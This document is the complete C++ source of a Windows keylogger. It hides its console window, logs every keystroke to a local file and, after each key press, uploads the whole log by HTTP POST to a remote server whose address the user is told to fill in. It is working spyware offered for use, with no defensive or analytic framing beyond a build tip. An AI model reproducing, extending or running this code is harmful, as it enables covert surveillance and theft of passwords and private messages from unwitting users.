
// Note: running it on vs code can cause compilation errors, it is suggested to run using msys mingw64.

#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <unordered_map>
#include <curl/curl.h>
#include <bits/stdc++.h>

using namespace std;

// Function to upload the full log content to the server
void sendLogToServer(const std::string &logContent)
{
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (curl)
    {
        // Replace this URL with your EC2 instance's Public IP or DNS
        const std::string serverUrl = "http://<ec2-public-ip>:3000/upload"; // this is a post req url
        curl_easy_setopt(curl, CURLOPT_URL, serverUrl.c_str());

        std::string postData = "log=" + logContent;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
        {
            // Error handling
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

std::string readLogFile()
{
    std::ifstream inFile("log.txt"); // Creates a file which gets read by server. this logs all the keystrokes
    if (!inFile.is_open())
    {
        return "";
    }
    std::stringstream buffer;
    buffer << inFile.rdbuf();
    inFile.close();
    return buffer.str();
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::unordered_map<int, bool> keyState;

    std::ofstream logFile("log.txt", std::ios::app);
    if (!logFile.is_open())
    {
        return 1;
    }
    // tracks pressed key
    while (true)
    {
        for (int key = 8; key <= 222; ++key)
        {
            SHORT state = GetAsyncKeyState(key);
            bool isPressed = state & 0x8000;

            if (isPressed && !keyState[key])
            {
                keyState[key] = true;

                switch (key)
                {
                case VK_SPACE:
                    logFile << " ";
                    break;
                case VK_RETURN:
                    logFile << "\n";
                    break;
                case VK_BACK:
                    logFile << "[BACKSPACE]";
                    break;
                case VK_TAB:
                    logFile << "[TAB]";
                    break;
                case VK_SHIFT:
                    logFile << "[SHIFT]";
                    break;
                case VK_ESCAPE:
                    logFile << "[ESC] Exiting...\n";
                    logFile.close();
                    sendLogToServer(readLogFile());
                    return 0;
                default:
                    if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9'))
                    {
                        bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                        char c = static_cast<char>(key);
                        if (!shift)
                            c = tolower(c);
                        logFile << c;
                    }
                    else
                    {
                        logFile << "[" << to_string(key) << "]";
                    }
                    break;
                }

                logFile.flush();
                sendLogToServer(readLogFile());
            }

            if (!isPressed && keyState[key])
            {
                keyState[key] = false;
            }
        }
        Sleep(10);
    }
    logFile.close();
    return 0;
}
